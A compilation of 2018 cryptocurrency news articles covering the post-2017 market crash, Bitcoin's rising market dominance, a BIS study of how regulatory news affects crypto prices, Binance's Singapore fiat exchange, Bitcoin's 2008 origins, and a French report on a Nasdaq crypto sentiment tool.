2018-09-12 18:00:47+00:00	The Unflippening: Bitcoin’s Resurgent Dominance Showing Who’s King	[]	"The volatile nature of the cryptocurrency market needs no introduction after its staggering gains in 2017 and subsequent losses of 2018. Looking at the market as a whole, however, gives us a bigger picture of who were the biggest losers and which coins were the best at storing value.

Total Market Cap Still 11 Times Bigger Than in 2017

The total cryptocurrency market capitalization hit highs of a staggering $830bn in the week commencing January 7, 2018, some $813bn – or nearly fifty times that of the same week in 2017 which stood at $17bn, with Bitcoin [coin_price] accounting for 35% of the total market share.

Nine months on and the euphoria that took hold at the end of 2017 has been replaced with despair and total capitulation of many investors. Total market cap now standing at $187bn; a staggering $643bn or 77% lower than highs earlier in 2018.

It is important to note that while the 2017 hype cycle has somewhat reversed, the total market cap is still 11 times what it was at the start of 2017.

Whilst some of the latecomers to the 2017 market are the biggest value losers, many investors in the space are still waist-deep in gains.

Total Market Cap 2018

Bitcoin [coin_price] has lost the greatest total value of $179 bn, representing a reduction of ‘only’ 62% from the highs seen earlier in the year, however, compared to an 85% reduction in that of the altcoins, which have lost $464bn.

Having spectacularly inflated and subsequently deflated, we can take a closer look at the biggest losers in the market:

Ripple [coin_price coin=ripple], NEM [coin_price coin=nem] Cardano [coin_price coin=ada], and TRON [coin_price coin=tron] have all lost over 90% of their value, with most of the other top coins being close behind.

Ripple, Ethereum [coin_price coin=ethereum] and Bitcoin Cash [coin_price coin=bitcoin-cash] have lost a staggering $244bn; more than twice the current total market cap of Bitcoin and nearly the total value of Bitcoin at its heights.

The only top coin to ‘outperform’ Bitcoin is EOS [coin_price coin=eos], which has only lost 43% of its value earlier in January 2018 and doubled its market share, according to data from Coinmarketcap.com.

Bitcoin Dominance



While the remainder of the market appears to be continuing to fall, Bitcoin has represented a relative flight to safety for many investors.

Bitcoin has regained some 23% of the total market share from altcoins, hitting a dominance of 58%, with no sign of slowing down.

So while questions remain as to where the bottom will be found for each cryptocurrency, Bitcoin has been stubbornly holding up its market cap lows at around $100bn as others have ‘decoupled.’

Bad News For Cryptocurrencies Not Named ‘Bitcoin’

Assuming investors do not leave the space, a ‘flight to bitcoin’ may result in an uptick in market transactions. Many investors are now tracking Bitcoin value on a network transaction basis, meaning an uptick would potentially serve as an indicator of a value investment with Bitcoin being 62% below its highs of around $20,000.

Questions will remain as to whether investors will return to the lower cap coins after such large price swings without fundamental demonstrative value. But surely some of those who exited the market will find it difficult to resist getting back into a market, which is down 85% from its previous highs.

Is the market dominance reversal indicative of the beginning of the end of the market correction, or is there some way to go?

Will the Bitcoin dominance continue for the forseeable future? Let us know your thoughts in the comments below.

2018-09-23 00:00:00+00:00	Regulating cryptocurrencies: assessing market reactions	['Raphael Auer', 'Stijn Claessens', 'More This Author']	"Regulating cryptocurrencies: assessing market reactions (02:01) Raphael Auer (Principal Economist) discusses how the valuations of cryptocurrencies, as well as their transaction volumes and user bases, react to news about regulatory actions. The BIS study suggests that cryptocurrency markets rely on regulated financial institutions to operate, bringing cryptocurrencies within reach of national regulation.

Cryptocurrencies are often thought to operate out of the reach of national regulation, but in fact their valuations, transaction volumes and user bases react substantially to news about regulatory actions. The impact depends on the specific regulatory category to which the news relates: events related to general bans on cryptocurrencies or to their treatment under securities law have the greatest adverse effect, followed by news on combating money laundering and the financing of terrorism, and on restricting the interoperability of cryptocurrencies with regulated markets. News pointing to the establishment of specific legal frameworks tailored to cryptocurrencies and initial coin offerings coincides with strong market gains. These results suggest that cryptocurrency markets rely on regulated financial institutions to operate and that these markets are segmented across jurisdictions, bringing cryptocurrencies within reach of national regulation.1

JEL codes: E42, E51, F31, G12, G28, G32, G38.

Cryptocurrencies2 such as Bitcoin3 or Ethereum have attracted much attention, because of both meteoric price swings and their advocates' claim of a new model of decentralised trust. Many are analysing the validity of such claims and the economics of the underlying technology (Biais et al (2018), BIS (2018), Carstens (2018a,b,c), CPMI (2015), Huberman et al (2017), Landau (2018)). Concurrently, many national authorities and international bodies have expressed concerns (eg G20 Finance Ministers and Central Bank Governors (2018), FSB (2018), Carney (2018)).

Key takeaways Cryptocurrencies such as Bitcoin have attracted much attention because of their meteoric price swings, but have also raised concerns for regulatory authorities.

While cryptocurrencies are often thought to operate out of the reach of national regulation, in fact their valuations, transaction volumes and user bases react substantially to news about regulatory actions.

News events related to general bans on cryptocurrencies or to their treatment under securities law have the greatest adverse effect on valuations, followed by news on combating money laundering and the financing of terrorism, and on restricting the interoperability of cryptocurrencies with regulated markets. News pointing to the establishment of legal frameworks tailored to cryptocurrencies and initial coin offerings coincides with strong market gains.

Because they rely on regulated financial institutions to operate and markets are (still) segmented across jurisdictions, cryptocurrencies are within the reach of national regulation.

Many of the concerns raised would also apply to other asset classes and emergent technologies. But what sets cryptocurrencies apart is that they can function without institutional backing and are intrinsically borderless.4 This raises the question of whether one can expect regulation - in particular national regulation - to be effective.

To shed light on this issue, we examine whether and how regulatory actions and communications about such actions have affected cryptocurrency markets. We do so using an event study approach. A number of jurisdictions have announced that they are considering whether and how to respond, and some have already responded. We use the market reactions to these regulatory statements and decisions to assess the anticipated effects on cryptocurrency markets.

Our four main findings are as follows. First, the market responds most strongly to news events regarding the legal status of cryptocurrencies. Besides general bans on their use for financial transactions, news events related to their possible treatment under securities market law have strongly adverse impacts, as do events explicitly signalling that cryptocurrencies will not be treated as a currency. News indicating possible novel legal frameworks tailored to cryptocurrencies and initial coin offerings (ICOs) coincides with strong market gains. Second, regulatory news regarding anti-money laundering/combating the financing of terrorism (AML/CFT) measures and limits on the interoperability of cryptocurrencies with the regulated financial system adversely impacts cryptocurrency markets. Third, authorities' unspecific general warnings have no effect, nor does news regarding the likelihood of central bank digital currency (CBDC) issuance. Last, large price differences sometimes prevail across jurisdictions, suggesting some market segmentation.

Overall, our analysis suggests that, at the current juncture, there is scope to apply regulations, if so decided. And it also indicates that regulation need not be bad news for the markets, with price responses notably signalling a clear preference for a defined legal status, albeit a light regulatory regime.

To tackle regulatory concerns, authorities will first need to clarify the regulatory classification of cryptocurrency-related activities, and to do so using criteria based on economic functions rather than the technology used. Related, the boundaries among national regulatory bodies may need to be redrawn to clarify responsibilities. Authorities will need to vigilantly monitor developments and address regulatory issues arising from the global dimension of cryptocurrencies. For policies to remain effective, and especially in case the market further develops and international arbitrage increases, rules and enforcement will need to be coordinated and enforced across the globe. But the absence of such coordination need not be an impediment to effective intervention.

This special feature is organised as follows. We first briefly review the current debate on why and how to regulate cryptocurrencies to help us classify news about (possible) policy interventions by category and regulatory stance. We then assess the effects of such news events on prices, trading volumes and other dimensions, including cross-border, based on a new data set of regulatory news events. Lastly we draw some lessons from our analysis.

An empirical investigation

Classifying news on cryptocurrency regulation

The goals of regulating cryptocurrencies are largely similar to those for other financial assets and services and can be classified into three categories: combating the use of funds for illicit activities;5 protecting consumers and investors against fraud and other abuses; and ensuring the integrity of markets and payment systems and overall financial stability. Regulatory authorities have a number of tools at their disposal for addressing these goals.

First, to address illicit use, responses can be aimed at those firms providing access to cryptocurrencies. Most consumers and investors do not directly own or trade cryptocurrencies, but rather use crypto-wallets and other intermediaries that hold claims on their behalf. Many relevant regulations may already pertain to such crypto-infrastructure providers; similarly, existing rules and enforcement mechanisms can be adapted to address specific issues. For example, AML/CFT regulations already in place can often be extended to cryptocurrencies. And existing consumer and investor protection laws and regulations can often be applied or adapted.

Second, regulations can target the interoperability of cryptocurrencies with regulated financial entities, including commercial banks, credit card companies and exchanges. Such regulated entities enable individuals to convert sovereign currency to cryptocurrencies and back. Rules can also be developed and applied with regard to the admissibility of cryptocurrencies and related products (such as derivatives or exchange-traded funds (ETFs)) on regulated exchanges. And regulation can address whether and how banks are allowed to deal in cryptocurrency-related assets for their customers or on their own behalf, and, if trading is allowed, what the associated tax implications are.

Third, authorities can clarify the legal status of cryptocurrencies. This shapes issues such as consumer protection (eg how to treat ownership rights, theft and mis-selling) and retail use (eg who may legitimately trade cryptocurrencies and under what conditions). Another key legal status issue is whether cryptocurrencies are treated as securities - ie tradable instruments used to raise funds by representing a promise to pay in the future - and thus come under heightened regulation and oversight. Alternatively, they could be considered generic assets (ie tangible or intangible things that can be owned or controlled, eg houses, commodities, patents), which means they can be held and traded, including on organised exchanges, without necessarily having to satisfy strict securities market rules and face corresponding oversight.6

To analyse these issues, we draw on Auer and Claessens (2018), who assemble a data set of news events regarding policy statements made by regulatory bodies, central banks and relevant international institutions and standard-setting bodies related to cryptocurrencies markets over the past years. Regulatory news events are classified into one of the three above main categories. In addition to classifying by regulatory aspects, we also differentiate events by regulatory stance. For this we use a simple coding scheme, namely a binary variable taking a value of +1 for events associated with tougher or more sharply defined regulation and -1 for events pointing to less stringent or less defined regulation.7 Additionally, we also code two auxiliary categories: one for general information and warnings issued to the general public on cryptoassets, and one on authorities' statements on CBDCs.8 We include all news events from the start of 2015 to the end of June 2018 as reported by the news agency Reuters, with the sample criterion being inclusion in this news channel.

In total we identify 151 regulatory news events.9 Graph 1 gives a breakdown of events by country, type and score (left-hand panel), by country (centre panel), and over time (right-hand panel). The left-hand panel shows that, after general warnings, news events related to interoperability are the most common. The centre panel shows that most news events are in China, India, Japan, the United Kingdom and the United States. The right-hand panel shows that news events have increased over time.

The price impact of regulatory news on bitcoin

We assess the intraday impact of regulatory news events first on the price of bitcoin, and then on the prices of other cryptocurrencies and on other aspects of the cryptocurrency markets. Prices are forward-looking and, using a standard event study methodology (Campbell et al (1996)), are often used to assess the eventual impact of corporate and public actions.

To illustrate our methodology, consider two events. One is the decision by the United States Securities and Exchange Commission (SEC) in March 2017 to turn down a proposal to alter stock exchange rules so as to allow the creation of an ETF for bitcoin. In the five minutes around the announcement, the price of bitcoin dropped by 16% (Graph 2, left-hand panel).10 Another event is the Japanese Financial Services Agency (FSA) ordering six cryptocurrency exchanges to improve their money laundering procedures (June 2018). Again, prices tanked - although it seems to have taken several hours, until the start of the US trading day, for this measure to have its full effect (right-hand panel).11

Using the same methodology, we can assess how prices on average adjust across news events (Graph 3), differentiating between favourable and unfavourable ones.12 We find that favourable events coincide on average with a 0.33% return in the 120 minutes around the events (left-hand panel), and a 1.52% return in the 24-hour window around them (right-hand panel). Unfavourable events are associated with a 0.32% and 3.12% lower return over similar windows, respectively. Events appear to already affect prices several hours before the news release, suggesting the news is in fact released gradually and information flows via other channels.

We next examine price responses to the various types of news over a longer window, to accommodate such gradual release. We examine the 24-hour and 10-day price responses.

Graph 4 examines returns surrounding four specific categories of legal news. The price responses signal a clear market preference for a defined legal status, but under a light regulatory regime. News pointing to an outright ban and non-recognition of the instruments as currencies is associated with negative returns, and strongly so for bans. However, news suggesting that cryptocurrencies could be treated as securities also leads to negative returns, probably reflecting the expectation that cryptocurrencies would be regulated more stringently. In contrast, the introduction of a specific, non-security legal framework generates positive returns, most likely as those frameworks generally come with oversight rules that are milder than those under securities law. The responses are qualitatively consistent between the one-day (left-hand panel) and the 10-day impact (right-hand panel), with the latter generally more pronounced.

We next examine news regarding AML/CFT and cryptocurrency-related infrastructure regulations. We identified 32 such news events. An example of favourable news was in February 2018, when officials from the SEC and the Commodity Futures Trading Commission (CFTC) issued statements before the US Congress that news agencies interpreted as ""putting crypto-currencies on a relatively long leash"".13 Examples of adverse news events were when the German Federal Financial Supervisory Authority (BaFin) issued an order in January 2018 to shut down a German-based crypto-exchange when on the same day the Japanese authorities announced mandatory IT security measures for crypto-exchanges.14

News indicating more restrictive AML standards for, and stricter regulation of, crypto-infrastructure providers is mostly associated with negative returns (Graph 5, left-hand panel). Such news led to negative returns over a 10-day window, with a median effect of around 4 percentage points, but with a wide distribution. For those days with more than one event, effects are much larger, some 24 percentage points.

Finally, we look at 42 news events related to interoperability with regulated markets and entities, of which four pertain to the interoperability of cryptocurrencies with banks, four to taxation, 20 to decisions on ICO applications and 14 decisions to listing applications for ETFs or derivatives. Interoperability is on average also associated with a decline, of some 6.4 percentage points (Graph 5, right-hand panel).

Regression analysis

We next investigate the price responses to regulatory news events using regressions, which allows us to examine statistical significance and the joint effects of news concerning various types of regulation. We estimate the following regressions in the 10-day window starting two days before the event and ending eight days after the event:

where in this specification P is again the price of bitcoin, R t is the regulatory score for each news event in the specific category on date t (or 0 if there is no event). In the regressions we thus also include the days without regulatory news to control for the ""normal"" daily movements in prices (or other dependent variables).

As before, news events are ""signed"" to reflect their expected impact on cryptocurrency usage. Specifically, we code legal status news as:

ie takes a value of +1 for a favourable news event, eg when a specific cryptocurrency framework is announced or news indicates that cryptocurrencies will not be considered to be a ""security"", and -1 whenever news indicates a ban, that cryptocurrencies are not considered as currencies, or that they will be considered securities. This coding scheme implies that positive values of are favourable events for cryptocurrencies.

Considering news events in terms of the three categories, the results confirm that events in each category have an economic and statistically significant impact (Table 1, columns 1-3). There is little change in the magnitudes of coefficients when estimated jointly (column 4). Importantly, the regression results show that the economic impact is again the largest for news about the legal status of cryptocurrencies. News in the other two categories has a statistically significant, but smaller, impact in terms of average market response.

Warnings disseminated by government agencies have no statistically significant effect on valuations (column 5). And the positive, but not significant, coefficient for the news on the stance of senior officials regarding CBDC (column 6) suggests that CBDCs are not seen as relevant for privately issued cryptocurrencies.

The wider crypto-ecosystem responses to regulatory news

Next we show that news events also affect the prices of cryptocurrencies other than bitcoin, cryptocurrency transaction volumes, the number of addresses15 (a gauge for the underlying number of users) and the profitability of mining cryptocurrencies. Since this analysis spans seven cryptocurrencies and up to seven variables of interest, we reduce its dimensionality for conciseness. Specifically, we construct a global cryptocurrency regulatory news index (CRNI). Since we have already established which types of news matter for Bitcoin, we construct this index as a linear combination of the three sets of consequential regulatory news, with weights equal to the average news impact on bitcoin prices (regression coefficients from the joint model in column 4 of Table 1):

This index captures how, on a given day, regulatory events would have moved the price of bitcoin. We then gauge the price responses of other cryptocurrencies to changes in this index, ie we essentially see whether the prices of these other cryptocurrencies reacted more or less strongly to regulatory news than bitcoin did, on average. Regression results for a range of prices are presented in Table 2, panel A. In column 1 the dependent variable is the change in the price of bitcoin, which shows by construction an elasticity of one.16 In columns 2-7, the dependent variable is the change in the price of ether (based on the Ethereum protocol), Bitcoin Cash, Litecoin, Monero, Zcash, and XRP (based on Ripple), respectively.

In terms of the responsiveness of cryptocurrencies compared with that of bitcoin,17 we find that both ""Bitcoin clones"" - Bitcoin Cash and Litecoin - as well as the second largest cryptocurrency by valuation, Ethereum, react significantly to CRNI (columns 2-4). The impact is not significantly different from 1, however, ie they are as strongly affected by these news events as bitcoin is. We next examine so-called ""dark coins"" Monero and Zcash - that add an extra layer of anonymity. Monero reacts significantly and more strongly than bitcoin (column 5), while Zcash (for which we only observe less than two years of data given its shorter life span) reacts less (column 6). The XRP token also react less, which may reflect that its network of trusted nodes is centrally controlled by its issuer Ripple, making the XRP token distinct from other, permissionless, cryptocurrencies.

The remainder of Table 2 shows that regulatory news also affects the number and the volume of transactions, the number of active addresses, and the profitability of mining. These statistics are only available for Ethereum and non-anonymous Bitcoin offshoots (Table 2, panels B-E). In these regressions, the dependent variable is a slower-moving, aggregate volume rather than a forward-looking price, so we expand the time window, defining the dependent variable as the percentage change of each aggregate from the 30 days preceding the event to the 30 days thereafter.

Bitcoin, Litecoin and Ethereum react strongly to news events as captured by the coefficient of CRNI for the number and the volume of transactions (in US dollars). The number of active addresses also responds strongly to CRNI, which may indicate that stronger regulation results in a decline in the number of users. The evidence for Bitcoin Cash is somewhat mixed: the number of transactions reacts little, while the average transaction volume reacts strongly, implying an increase in the average transaction size.

Finally, miners, ie those engaged in verifying transactions, are also affected by news events. In order to gauge this, we analyse a measure of profitability calculated as the revenue from block rewards and transaction fees minus the estimated cost of coming up with a proof-of-work. For all four cryptocurrencies with detailed data available, profitability declines strongly whenever regulation becomes tighter. Since profitability is likely to affect exit and entry of miners, this response ultimately can also affect the security of the various cryptocurrencies.

National regulation of global cryptocurrencies

Why do news events about national regulations have such a substantial impact on cryptoassets that have no formal legal homes and are traded internationally? Part of our interpretation is that cryptocurrencies rely on regulated institutions to convert regular currency into cryptocurrencies. Their cumbersome setup also means that many consumers hold and transact in cryptocurrencies through more interfaces, such as online crypto-wallets that are often regulated, or can be regulated in principle. And international arbitrage is still limited. Agents cannot easily access cryptocurrencies' markets offshore - because they may need to have a bank account in the foreign jurisdiction. Factors such as these create market segmentation and fragmentation, which currently make national regulatory actions bind to some degree.18

One example of likely market segmentation is the so-called ""kimchi premium"", the fact that the price of bitcoin in Korea regularly exceeds that in the United States, at times by over 50% (Graph 6, left-hand panel). This suggests limits to cross-border arbitrage. Similarly, news about cryptocurrency regulation by authorities in China has led at times to price differentials compared with the US market (Graph 6, centre panel).

Yet national regulatory measures do spill across borders. For example, when China hinted at the possibility of strict regulation of Bitcoin around the end of January 2017, bitcoin trading shifted massively towards other Asian currencies (Graph 6, right-hand panel).

Conclusion

Our analysis shows that despite the entity-free and borderless nature of cryptocurrencies, regulatory actions as well as news regarding potential regulatory actions can have a strong impact on cryptocurrency markets, at least in terms of valuations and transaction volumes. This suggests that at the current juncture, authorities around the globe do have some scope to make regulation effective.

Looking ahead, there are three key challenges.

First, to effectively address regulatory concerns and achieve technology-neutral regulation, authorities will need to clarify cryptocurrency-related activities from legal and securities market perspectives, and to do so according to economic purpose rather than technology used. Related, the boundaries among national regulatory bodies may need to be redrawn to clarify responsibilities.

Second, although markets are currently somewhat segmented, cross-border spillovers can occur in response to regulatory events. As the market continues to evolve, and if more banks and funds engage in cross-country arbitrage, regulation and enforcement in one jurisdiction may lead activity to migrate to others with more lax approaches. Coordination has already been found to enhance the effectiveness of AML standards, with authorities seeking to treat similar products and services consistently according to their function and risk profile across jurisdictions (eg Financial Action Task Force (2015)). To maximise impact and avoid leakages, internationally consistent approaches should be used for cryptocurrencies as well.

Finally, while we did not analyse this in the current study, a number of observers have concluded that at the current stage of market development, cryptocurrencies do not appear to present macroeconomic or financial stability issues (Carney (2018), FSB (2018)). And while illicit uses of course transcend borders, it seems hard to use cryptocurrencies to circumvent capital controls on a large scale. That said, new types of crypto-products, such as crypto-funds and derivatives on cryptocurrencies and cryptoassets, create additional linkages with the financial system. And cryptocurrencies and other cryptoassets can piggyback on the conventional financial system. A loss of public trust in cryptoasset markets could translate into distrust in the broader financial system and its regulators. While cryptoassets thus do not, at this point, pose a global financial stability risk, it is important to remain vigilant, monitor developments and respond to potential threats.

2018-09-06 00:00:00+00:00	If you bought at the top of the crypto bubble, here's how much you've lost	['Kate Rooney']	"A Bitcoin conference in New York. Getty Images

Those who bought cryptocurrency at the start of 2017 likely felt pretty savvy in December. But if you bought late last year, that's certainly not the case today. The entire crypto market has lost roughly 65 percent of its value as of Thursday but some coins have fared worse than others. Here's where you'd stand if you invested $1,000 in the top five coins at the height of their hype:

Bitcoin

Bitcoin, the world's first and largest cryptocurrency has held up better than others. It's down more than 54 percent this year, and was trading around $6,400 Thursday. The cryptocurrency became a household name as it hit a high near $20,000 on December 16, 2017. If you put $1,000 into bitcoin on that day, you would have lost about $650, with $350 left in it today.

Ether

The world's second largest cryptocurrency has nosedived 70 percent this year, and fell 15 percent this week alone. Ether is the name of the cryptocurrency but it's closely associated to the popular Ethereum blockchain. Unlike bitcoin, which gives access to a global financial network, ether gives you access to a computer network. Investors saw an opportunity in its use case for building applications but that hype has faded significantly this year. If you put $1,000 in ether at its high in January, you would have lost $836.

Bitcoin Cash

Bitcoin Cash is an offshoot of the original bitcoin. The cryptocurrency was born last August out of a ""fork,"" by a group of developers who were frustrated with some technology issues behind bitcoin, including ""scalability."" Bitcoin Cash increased the size of the blocks, meaning more transactions could happen per second. If you put $1,000 in bitcoin cash at the high in December, you would have lost $858 by September of this year.

Litecoin

Litecoin would have been a great investment if you got in early — it was up 8,000 percent at one point last year. The cryptocurrency was inspired and technically, is almost identical to bitcoin but proponents say transactions are faster and cheaper. If you bet $1,000 on Litecoin at its high in December, you would have lost $833 as of Thursday. The cryptocurrency is now trading around $50 after topping $330 late last year.

Medium of exchange: Crypto-currencies are not readily accepted as a medium of exchange. Despite sporadic news that appear from time to time, we have seen no real evidence that crypto-currencies are widely used as a medium of exchange in the purchase of goods or services in any meaningful scale. While it is true that crypto-currencies such as Bitcoin have attracted many investors and speculators around the world who own and trade them, it is very different from such crypto-currencies being accepted as a medium of exchange. As a matter of fact, Bitcoin is a very inefficient means of payment for several reasons. First, as Bitcoin operates in a decentralised network, each Bitcoin transaction needs to be validated by the so-called “miners”, who need to solve a complex maths problem using specialised computers. It takes a lot of time and consumes considerable electricity to complete a transaction. Currently, the average transaction time is some 20 minutes per transaction. During periods of high network traffic, the average transaction time can take anywhere from 30 minutes to many hours. Transaction fee is also high and can spike up suddenly from time to time. The average fee per transaction in December 2017 was US$34. To put the matter into proper perspective, electronic payments, using either balances kept by commercial banks at central banks or retail payments using commercial bank balances, typically take a few seconds and cost a fraction of the transaction fees in Bitcoin transfers."

Since its debut in mid-2017, Binance has experienced exponential growth in terms of daily trading volume and user base, evolving into the biggest cryptocurrency exchange in the global market. In the past nine months, Binance has released a blockchain startup accelerator called Binance Labs, Binance Charity, and a prototype for a decentralized exchange.

Earlier this month, Binance officially announced the launch a fiat cryptocurrency exchange in Singapore, equipped with seamless user experience and fiat (Singaporean dollar) integration. On Binance Singapore, users are able to deposit and withdraw the Singaporean dollar to trade cryptocurrencies with the national currency.

Yi said:

“Our mission at Binance is to contribute to the development of the blockchain industry by building the infrastructure for the ecosystem. Fiat currencies are a very important part of blockchain transactions. By launching a fiat exchange, we hope to provide users with a more complete user experience, and enable not only the exchange and transaction of fiat currency but also future investments in blockchain projects, media, education and other blockchain fields.”

Finding a Trusted Banking Partner in Singapore, Regulatory State

For fiat-enabled cryptocurrency exchanges, trusted banking partners are of utmost importance. Trading platforms need stable banking service providers to streamline the process of sending and receiving Singaporean dollar to and from exchanges.

With strict Know Your Customer (KYC) and Anti-Money Laundering (AML) systems in place that are in accordance with local regulations, Yi stated that the exchange will continue to cooperate with local financial regulators and leaders to grow the cryptocurrency exchange market of Singapore.

The exchange is confident in the financial system of Singapore, a country that has often been described as the global financial center with a rapidly growing economy, alongside Hong Kong and Switzerland.

She explained:

“Singapore is a global financial center that has a developed economy and is politically stable. On top of that, Singapore has a high degree of insight and judgment into both finance and the Internet. We are looking forward to working with leaders in the space and will undergo KYC and AML procedures in strict accordance with local regulations, and we will cooperate in full accordance with the bank’s specifications.”

Already, with favorable cryptocurrency regulations, Singapore has started to attract large-scale cryptocurrency-related businesses and Internet conglomerates. Earlier this year, Kakao, the biggest Internet conglomerate in South Korea, revealed its plans to establish a blockchain venture in Singapore, which has become an important cryptocurrency market for Asia.

In May, the Monetary Authority of Singapore (MAS), Singapore’s central bank and financial regulatory authority, released a consultation paper which explicitly disclosed the agency’s intent to review the regulatory framework for crypto market operators to ensure that it is capable of meeting the demands of the exponentially growing market.

With the forward-thinking approach of the Singaporean government towards crypto, blockchain technology and fintech, He stated that the cryptocurrency sector of Singapore presents a rare and exciting opportunity for businesses.

Yi added:

“I believe Singapore will also play a significant role in the blockchain industry; many countries and regions with highly developed financial industries lack a direct relationship with their people, yet blockchain technology is decentralized at its core and has no geographical restrictions. For the forward-looking governments that value technology, this is a rare and exciting opportunity.”

Trends of the Crypto Market

A few years ago, Changpeng Zhao, the beloved CEO of Binance better known to the cryptocurrency community as CZ, sold his house to purchase Bitcoin, the most dominant cryptocurrency in the market.

But, the cryptocurrency market endured the fourth worst correction in its nine-year history, as Bitcoin recorded a 69 percent drop from its all-time high of $19,500.

Still, Yi emphasized that CZ was hardly shaken by his decision, even though the valuation of the property he sold doubled. Yi is still highly confident in the cryptocurrency industry, especially with the majority of employees at Binance receiving a portion of their salaries in Binance Coin (BNB).

“I am full of confidence in this industry – and typical for those who feel this way, I am devoting my all to this industry. Nearly all Binance employees are receiving part of their salaries in BNB, and many have heard how CZ sold his house to buy bitcoin years ago,” Yi said. “In fact, just two years after he purchased the bitcoin, that house had doubled in value, yet the price of bitcoin had crashed immensely. CZ never doubted and was hardly shaken, and my personal assets are basically all held in cryptocurrency to this day. This is faith.”

With the cryptocurrency market of Singapore, South Korea, Japan, and many European nations growing at a rate, and businesses like Binance expanding internationally, the long-term future of the crypto market remains optimistic."

Bitcoin has dropped almost $1,000 in value over the last 24 hours.

Ethereum has slumped 20% to its lowest level in over a year.

The move downwards started on Wednesday, and was exacerbated by a Business Insider report that Goldman Sachs has shelved plans to create a bitcoin trading desk.

You can track the price of bitcoin and all other cryptocurrencies at Markets Insider.

The sharp sell-off that gripped cryptocurrency markets on Wednesday has extended into a second day, with major digital assets across the spectrum continuing to fall during trading on Thursday.

Wednesday's initial move seemed to have no real catalyst, beyond a theory put forward by Tanya Abrosimova of FXStreet is that the introduction of a registration process for the popular instant bitcoin exchange ShapeShift may have spooked some users and triggered at least part of the drop.

The slump was then exacerbated by a Business Insider report that Goldman Sachs has put plans to launch a bitcoin trading desk on hold for the foreseeable future.

That news saw bitcoin hold 4% lower at around $7,000 per coin, before falling again late on Wednesday evening. It has held relatively steady since then, but has now fallen more than $1,000 in value in just two trading sessions.

By around 9.40 a.m. ET, bitcoin is trading at $6,428, a drop of 4.1% since the session's beginning.

The crypto slump is impacting other currencies, with litecoin and bitcoin cash both lower by more than 3%, while ethereum, has slumped 20% in value over the past 24 hours, falling to its lowest level in over a year.

In line with ethereum’s latest fall, hundreds of alt-coins on the website coinmarketcap.com have posted declines of around 20% over the last 24 hours."
2018-09-13 04:22:07+00:00	The 2008 global meltdown and the birth of Bitcoin	['Shaikh Zoaib Saleem']	"When iconic US investment bank Lehman Brothers Holdings Inc. filed for bankruptcy in 2008, it shook people’s faith in banks so much that a new class of asset, which did not have the backing of any formal bank, came into being. Bitcoin, the most popular cryptocurrency, first found a mention in November 2008, about two months after the Lehman crisis.

A decade later, cryptocurrencies have become one of the most debated financial assets, globally and in India, in terms of risk and returns.

From a value below $1, its first known value in 2010, Bitcoin’s present value is now $6200, down about 70% from about $20,000 in December 2017, when it peaked.

The birth of Bitcoin

On 1 November 2008, a techie by the name Satoshi Nakamoto wrote in an email to a cryptography mailing list: “I’ve been working on a new electronic cash system that’s fully peer-to-peer, with no trusted third party. The paper is available at bitcoin.org/bitcoin.pdf."" The technical paper is still available on the link.

The main properties of the system, Satoshi said, would be that the electronic transactions would be peer-to-peer and would not need to be sent to a financial institution. The system was designed to be completely de-centralised, meaning that the users of the currency would not need to repose their trust in a central authority, such as traditional central banks. In another post in early 2009, Satoshi said that everything in the newly-built system is based on crypto proof instead of trust.

Satoshi also expressed dissatisfaction that central banks and banks have repeatedly breached the trust of the people who deposit money with them by lending the money in credit bubbles while keeping very little as a reserve. “The root problem with conventional currency is all the trust that’s required to make it work. The central bank must be trusted not to debase the currency, but the history of fiat currencies is full of breaches of that trust,"" Satoshi wrote.

The 1st transaction

A couple of months after floating the idea of this cryptocurrency, Satoshi created 50 Bitcoins with the very first transaction on the blockchain at 18:15:05 hours on 3 January 2009. The system is so designed that the initial 50 BTCs can’t be used or spent.

The transaction had an embedded message, including a timestamp, that indicated the Bitcoin founder’s possible nudge to finally make Bitcoin live. The message read “The Times 03/Jan/2009 Chancellor on brink of second bailout for banks"". The message referred to a headline of a news article that appeared that day in The Times in the UK that talked about a second bailout for the banks.

Story thereafter

When Bitcoin and the concept of decentralised cryptocurrency started gaining popularity in 2011, other cryptocurrencies also started coming up. Litecoin was among the first cryptcurrencies to come up in 2011. Ether or Ethereum, another popular one, came into existence in 2015. At present, there are a few hundred cryptocurrencies being traded worldwide, and a new “Initial Coin Offering"" is announced every few days.

The idea probably came into effect due to Satoshi’s dissatisfaction with the existing financial system. Satoshi wanted Bitcoin to be a currency, which could be used for peer-to-peer transactions without having to trust a third party like a central bank. However, over the years, Bitcoin and some other popular cryptocurrencies have turned more into an asset rather than a currency.

In fact, some service providers, in several countries, started accepting some cryptocurrencies, including Bitcoin, in exchange of their services. However, having an extremely volatile value has been the biggest concern around cryptocurrencies, which makes it an unsafe option for the retail investors."

2018-09-12 16:00:39+00:00	Le Nasdaq développe un outil pour anticiper les prix du crypto market	[]	"Plus tôt cette année, Adena Friedman, PDG du Nasdaq, avait déclaré que la société envisageait de s’engager sérieusement dans le marché des cryptomonnaies, notamment via le lancement d’un produit à terme sur le bitcoin, ou la création d’un exchange crypto. Aujourd’hui, il semblerait que le Nasdaq soit sur un nouveau projet, la création d’un outil d’analyse et d’anticipation des prix de plus de 500 cryptomonnaies.

Le marché crypto est un marché riche en données. En effet, il aggrège un mélange d’informations provenant des wallets clients, des blockchains en elles-même, mais aussi (et surtout) des médias sociaux, tels que Twitter ou Reddit. Il est évident que le marché des cryptomonnaies, peut être plus que les autres, est très influencé par les médias sociaux, où une simple annonce peut déclencher un pump ou un dump.

Selon une source proche du Nasdaq, l’opérateur de marché américain travaillerait, via son centre « Analytics hub » sur les capacités du « machine learning » et du « Natural Language Processing » (NLP), pour essayer de deviner le sentiment et l’orientation potentielle du marché crypto, en se basant notamment sur les tendances observées sur les médias sociaux (Twitter, Reddit…). La source aurait ajouté que le service fournirait des informations sur plus de 500 actifs crypto, basés sur une analyse de trois critères : les flux de fonds via les portefeuilles, les données des bourses et les médias sociaux.

Bill Dague, responsable des données alternatives au Nasdaq a réagit en affirmant à Coindesk, que le Nasdaq travaillait bien sur des solutions d’intelligence artificielle et d’analyse de données, mais qu’aucune décision ferme et rapide n’aurait été encore prise pour ajouter l’outil aux logiciels d’analyse de marché du Nasdaq.

Jusqu’à présent, « l’analytics hub », se concentrait uniquement sur les actifs traditionnels, mais l’ajout de données crypto semble être un autre signal de l’intérêt croissant de Wall Street, et des investisseurs institutionnels plus globalement, pour le secteur des cryptomonnaies.

« En ce qui concerne la partie sur le « sentiment des médias sociaux », donc l’application du machine learning et du NLP, je peux vous dire que tout commencera avec Twitter et pourrait inclure dans le futur StockTwits et peut-être Reddit, » déclare la source.

